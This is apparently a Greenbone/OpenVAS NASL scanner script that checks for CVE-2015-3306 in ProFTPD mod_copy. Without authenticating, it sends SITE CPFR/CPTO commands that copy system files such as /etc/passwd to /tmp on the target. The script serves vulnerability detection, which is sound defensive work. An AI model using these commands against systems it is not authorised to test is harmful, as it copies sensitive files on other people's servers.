CPE = "cpe:/a:proftpd:proftpd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105254" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-04-13 18:15:12 +0200 (Mon, 13 Apr 2015)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "ProFTPD `mod_copy` Unauthenticated Copying Of Files Via SITE CPFR/CPTO" );
	script_cve_id( "CVE-2015-3306" );
	script_category( ACT_ATTACK );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "secpod_proftpd_server_detect.sc", "os_detection.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ProFTPD/Installed" );
	script_xref( name: "URL", value: "http://bugs.proftpd.org/show_bug.cgi?id=4169" );
	script_tag( name: "impact", value: "Under some circumstances this could result in remote code execution" );
	script_tag( name: "vuldetect", value: "Try to copy /etc/passwd to /tmp/passwd.copy with SITE CPFR/CPTO" );
	script_tag( name: "solution", value: "Ask the vendor for an update" );
	script_tag( name: "summary", value: "ProFTPD is prone to an unauthenticated copying of files vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!loc = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	send( socket: soc, data: "site cpfr /" + file + "\n" );
	recv = recv( socket: soc, length: 128 );
	if(!ContainsString( recv, "350 File or directory exists" )){
		continue;
	}
	send( socket: soc, data: "site cpto /tmp/passwd.copy\n" );
	recv = recv( socket: soc, length: 128 );
	if(ContainsString( recv, "250 Copy successful" )){
		close( soc );
		security_message( data: "The target was found to be vulnerable", port: port );
		exit( 0 );
	}
}
close( soc );
exit( 99 );

